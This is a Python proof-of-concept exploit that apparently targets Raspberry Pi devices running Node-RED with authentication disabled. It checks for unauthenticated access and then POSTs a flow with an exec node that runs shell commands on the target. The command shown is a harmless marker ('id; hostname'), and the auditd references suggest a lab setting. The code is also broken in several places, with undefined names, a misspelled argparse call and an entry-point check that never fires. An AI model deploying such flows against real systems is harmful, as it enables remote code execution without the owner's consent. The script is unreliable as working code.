import argparse
import json
import subprocess
import sys

ERROR = '\033[91m [!!!]\033[0m'
WARNING = '\033[93m [*]\033[0m'
NOTIFICATION = '\033[96m[+]\033[0m'
CRITICAL = '\033[43m>>>\033[0m'
COLOUR_END = '\033[0m'
UNDERLINE = '\033[4m'

try:
    import requests
except ImportError:
    sys.exit(f"{ERROR} Request unavailable. Try: pip install requests")

targetHost = input("Target Host: ")
targetPort = input("Target Port: ")
piUser = input("Target Device User: ")

options = ["flows", "settings", "nodes", "context", "subflows", "palette"]

while True:

    targetTopic = input("Target Topic (Enter '-h' for topic types): ")

    if targetTopic == "-h":
        print("Available options:")
        for option in options:
            print(f"  {option}")
        continue

    if targetTopic in options:
        print(f"Selected option: {targetTopic}")
        break

    print("Invalid option. Enter -h to see available options.")

targetURL = f"http://{targetHost}:{targetPort}/{targetTopic}"

nodeConfirm_File = "/tmp/RCEnodeConfirm.txt" #evidence file spawned on Pi

print(f"Target URL: {targetURL}")

flowPayload = [
    {
        "id": "nodeTab",
        "type": "tab",
        "label": "Remote Code Execution",
        "disabled": False,
    },
    {
        "id": "nodeInjection",
        "type": "inject",
        "z": "nodeTab",
        "name": "fireOnce_Inject",
        "once": True,
        "onceDelay": 0.1, 
        "topic":"",
        "payload":"",
        "payloadType": "date",
        "wires": [["flowDeploy_exec"]]
    },
    {
        "id": "flowDeploy_exec",
        "type": "exec",
        "z": "nodeTab",
        "name": "confirmRCE",
        "command": (
            f"id; hostname; "
            f"echo {nodeConfirm_File}"
        ),
        "addpay": False,
        "append":"",
        "useSpawn": "false",
        "timer":"",
        "winHide": False,
        "oldrc": False,
        "wires": [[], [], []]
    }
]

def authCheck():
    print(f"{NOTIFICATION} GET {targetURL}")
    print(f"\n{NOTIFICATION} Accessing authorization settings")
    try:
        r = requests.get(settingsURL, timeout=5)
    except requests.exceptions.ConnectionError:
        print(f"{ERROR} {targetURL} could not be reached.")
        print(f"{WARNING} Try: Check host status")
        sys.exit

    print(f" HTTP {r.status_code}")
    if r.status_code == 200: #200 OK - Operational
         print(f"{NOTIFICATION} {targetURL} returned '200' without credentials")
         print(f"{CRITICAL} NO AUTHENTICATION NEEDED")
         print(f" Body: {r.text[:120]} \n")
         return True
    elif r.status_code == 401:
        print(f"{ERROR} {targetURL} returned '401' without credentials")
        return False
    else:
        print(f"{WARNING} Unexpected status {r.status_code}")

def deployTarget_Flow():
    headers = {
        "Content-Type": "application/json",
    }
    body = json.dumps(flowPayload)

    print(f"{NOTIFICATION} POST {targetURL}")
    print(f"Content-Type: application/json")
    print(f"authorization: disabled")
    print(f"Payload: {len(flowPayload)} nodes")
    f"(tab + inject + exec)"
    print(f"Exec command: {flowPayload[2]['command']}\n")

    try:
        resp = requests.post(targetURL, headers=headers, data=body, timeout=10)
    except requests.exceptions.ConnectionError:
        print(f"{WARNING} Cannot reach {targetURL}")
        print(f"Try: Check Pi state and services")
        sys.exit(1) 

    print(f"{NOTIFICATION} Response: HTTP {resp.status_code} {resp.reason}")

    if resp.status_code in (200, 204):
        print(f"{NOTIFICATION} Flow deployment effective")
        print(f"{NOTIFICATION} exec node firing...") 
        print("auditd firing -k rce_marker + -k proc_exec")
        return True
    elif resp.status_code == 401:
        print(f"{WARNING} 401 - adminAuth set. Try: 'grep adminAuth ~/.node-red/settings.js'")
        return False
    elif resp.status_code == 400:
        print(f"{WARNING} 400 - Bad request. Note: JSON likely misconfigured.")
        return False
    else:
        print(f"{WARNING} Unknown response {resp.status_code}: {resp.text[:200]}")
        return False

def main():
    parser = argparse.argumentParser()
    parser.add_argument("--check", action="store_true")
    parser.add_argument("--verify", action="store_true")
    parser.add_argument("--dry-run", action="store_true")

    args = parser.parse_args()

    if args.dry_run:
        print(f"{NOTIFICATION} Dry-run active - flow payload unsent")
        print(json.dumps(flowPayload), indent=2)
        return
    
    if args.check:
        ok = authCheck()
        if not ok:
            sys.exit(1)

    deploy = deployTarget_Flow()

    if deployed and args.verify:
        import time 
        print(f"{Warning} Exec node booting - Wait 5 seconds")
        time.sleep(5)
        verifyRCE()

    if deployed:
        print("\n" + "-" * 60)

if __name__ == "__main":
    main()